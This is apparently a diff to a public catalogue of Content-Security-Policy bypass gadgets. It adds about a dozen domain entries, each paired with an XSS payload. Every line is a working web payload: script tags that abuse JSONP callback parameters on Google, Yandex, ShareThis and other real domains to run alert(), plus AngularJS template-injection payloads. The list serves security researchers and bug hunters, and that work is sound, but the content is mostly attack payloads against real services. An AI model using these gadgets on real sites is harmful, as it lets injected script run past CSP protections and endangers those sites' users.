@@ -43,6 +43,7 @@ api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=al
 api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
 api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>
 api.ninchat.com  <script src="https://api.ninchat.com/v2/call?data=%7B%22action%22%3A%22describe_queue%22%2C%22realm_id%22%3A%221%22%2C%22queue_id%22%3A%221%22%7D&callback=alert(1)"></script>
+api.ninchat.com  <script src="https://api.ninchat.com/v2/endpoint?callback=alert(1)"></script>
 api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
 api.onesignal.com  <script src="https://api.onesignal.com/sync/0a5d329d-664d-4253-9bdd-62f208e2ae79/web?callback=alert(1)"></script>
 api.parsely.com	<script src="https://api.parsely.com/v2/profile?callback=window.alert(window.origin)"></script>
@@ -70,6 +71,7 @@ assets.grubhub.com	<body ng-app ng-csp><script src="https://assets.grubhub.com/l
 assets.guim.co.uk	<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>
 assets.twitch.tv	<script src="https://assets.twitch.tv/eppo/api/flag-config/v1/config?sdkName=js-sdk-client&sdkVersion=3.1.2&apiKey=3mv-BKCSZJDyZrwfqK86har6u13NgxRh.ZWg9bTRsZHJnLmUuZXBwby5jbG91ZCZjcz1tNGxkcmc&callback=alert()">
 avada.io	<script src="https://avada.io/wp-json?_jsonp=window.alert"></script>
+availability.loadbee.com  <script src="https://availability.loadbee.com/v3/ean/1/a?callback=alert"></script>
 bildirt.com	<script src="https://bildirt.com/wp-json?_jsonp=window.alert"></script>
 boards.greenhouse.io	<script src="https://boards.greenhouse.io/uncacheable_attributes/presigned_fields?callback=window.alert"></script>
 bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=window.alert"></script>
@@ -98,6 +100,7 @@ clientauthconfig.clients6.google.com	<script src="https://clientauthconfig.clien
 clients1.google.com	<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
 clients6.google.com	<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>
 clients6.google.com	<script src="https://clients6.google.com/drive/v2internal/apps?openDrive=true&reason=301&syncType=0&errorRecovery=false&fields=kind%2CdefaultAppIds%2Citems%28kind%2Cid%2CuseByDefault%2Cname%2CopenUrlTemplate%2CprimaryMimeTypes%2CsecondaryMimeTypes%2CcreateUrl%2CcreateInFolderTemplate%2CobjectType%2CsupportsCreate%2CsupportsImport%2CsupportsMultiOpen%2CsupportsOfflineCreate%2Cinstalled%2Cauthorized%2CproductUrl%2CprimaryFileExtensions%2CsecondaryFileExtensions%2CshortDescription%2ClongDescription%2CproductId%2Cremovable%2Cicons%28iconUrl%2Csize%2Ccategory%29%2Ctype%2CchromeExtensionIds%2CrequiresAuthorizationBeforeOpenWith%2ChasDriveWideScope%2CdriveBranded%2CdriveSource%2CsupportsMobileBrowser%2CsupportsTeamDrives%2ChasGsmListing%29&languageCode=en&retryCount=0&dsNonce=cfgr2b5makyz&key=AIzaSyDLol3l87BBbfa-oQPI1b_5ymSTx8j30Ik&callback=alert(1)-1;"></script>
+clients6.google.com <script src="https://clients6.google.com/drive/v2internal/files?callback=alert(1)"></script>
 cloudinary.com	<script src="https://cloudinary.com/wp-json?_jsonp=window.alert"></script>
 cloudusersettings-pa.clients6.google.com	<script src="https://cloudusersettings-pa.clients6.google.com/v1alpha1/settings/CONSOLE_PINS/keys/CLOUD?callback=alert(1)"></script>
 code.angularjs.org	<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
@@ -107,6 +110,9 @@ connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&call
 connectad.io	<script src="https://connectad.io/wp-json?_jsonp=window.alert"></script>
 content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 content.googleapis.com	<script src="https://content.googleapis.com/discovery/v1/apis?callback=alert(document.domain);var%20ignorethat="></script>
+content.googleapis.com  <script src="https://content.googleapis.com/drive/v2beta/apps?callback=alert(1)"></script>
+count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
+core.helloretail.com  <script src="https://core.helloretail.com/partner/init.html?jsonp=alert(1)"></script>
 core-renderer-tiles.maps.yandex.net  <script src="https://core-renderer-tiles.maps.yandex.net/tiles?l=mapj&v=1&x=1&y=520&z=11&callback=alert"></script>
 core-stv-renderer.maps.yandex.net  <script src="https://core-stv-renderer.maps.yandex.net/2.x/tiles?l=stj&x=1&y=1&z=11&scale=1&v=1&format=js&callback=alert"></script>
 count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
@@ -216,6 +222,7 @@ page.gitlab.com	<script src="https://page.gitlab.com/index.php/form/getForm?munc
 pages.nist.gov	<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=window.alert&client=ca-pub-3374367632700222"></script>
 passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
+places.googleapis.com  <script src="https://places.googleapis.com/v1/places:autocomplete?callback=alert(1)"></script>
 polo.feathr.co	<script src="https://polo.feathr.co/v1/analytics/match/script.js?pk=alert"></script>
 polyfill-fastly.io	<script src="https://polyfill-fastly.io/v3/polyfill.min.js?callback=alert"></script>
 polyfill.alicdn.com	<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?callback=alert"></script>
@@ -245,6 +252,7 @@ s.swiftypecdn.com	<script src="https://s.swiftypecdn.com/install/v2/config/N-DNg
 s.yimg.jp	<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 sanalofisonline.com	<script src="https://sanalofisonline.com/wp-json?_jsonp=window.alert"></script>
+searchserverapi1.com  <script src="https://searchserverapi1.com/getresults?api_key=4I5Z1z9w9Z&&output=jsonp&callback=alert(1)"></script>
 search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>
 secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=window.alert"></script>
 securepubads.g.doubleclick.net	<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=window.alert"></script>
